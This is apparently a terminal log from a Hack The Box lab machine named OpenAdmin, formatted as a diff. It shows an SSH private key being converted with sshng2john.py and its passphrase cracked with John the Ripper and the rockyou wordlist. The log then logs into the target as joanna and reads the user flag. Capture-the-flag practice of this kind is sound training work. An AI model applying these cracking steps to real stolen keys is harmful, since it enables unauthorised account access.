@@ -1,0 +1,42 @@
+64accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d                            
+user@kali:/mnt/windows/htb/boxes/openadmin$ sshng2john.py openadmin.joanna.id_rsa > openadmin.joanna.id_rsa.john                            
+user@kali:/mnt/windows/htb/boxes/openadmin$ john --wordlist=/usr/share/wordlists/rockyou.txt openadmin.joanna.id_rsa.john                   
+Using default input encoding: UTF-8                                  
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])                                                                 
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes                                                         
+Cost 2 (iteration count) is 1 for all loaded hashes                  
+Note: This format may emit false positives, so it will keep trying even after                                                              
+finding a possible candidate.     
+Press 'q' or Ctrl-C to abort, almost any other key for status        
+bloodninjas      (openadmin.joanna.id_rsa)                           
+1g 0:00:00:09 DONE (2020-03-25 00:38) 0.1019g/s 1461Kp/s 1461Kc/s 1461KC/s *7¡Vamos!                                                       
+Session completed                 
+user@kali:/mnt/windows/htb/boxes/openadmin$                           
+user@kali:/mnt/windows/htb/boxes/openadmin$ ssh -i ~/Downloads/openadmin.joanna.id_rsa joanna@10.10.10.171                                  
+Enter passphrase for key '/home/user/Downloads/openadmin.joanna.id_rsa':                                                                    
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)   
+
+ * Documentation:  https://help.ubuntu.com                           
+ * Management:     https://landscape.canonical.com                   
+ * Support:        https://ubuntu.com/advantage                      
+
+ System information disabled due to load higher than 2.0             
+
+
+ * Canonical Livepatch is available for installation.                
+   - Reduce system reboots and improve kernel security. Activate at: 
+     https://ubuntu.com/livepatch 
+
+41 packages can be updated.       
+12 updates are security updates.  
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                      
+
+
+Last login: Tue Mar 24 22:34:52 2020 from 10.10.14.224               
+joanna@openadmin:~$ ls -l         
+total 4                           
+-rw-rw-r-- 1 joanna joanna 33 Nov 28 09:37 user.txt                  
+joanna@openadmin:~$ cat user.txt  
+c9b2cf07d40807e62af62660f0c81b5f  
+joanna@openadmin:~$               
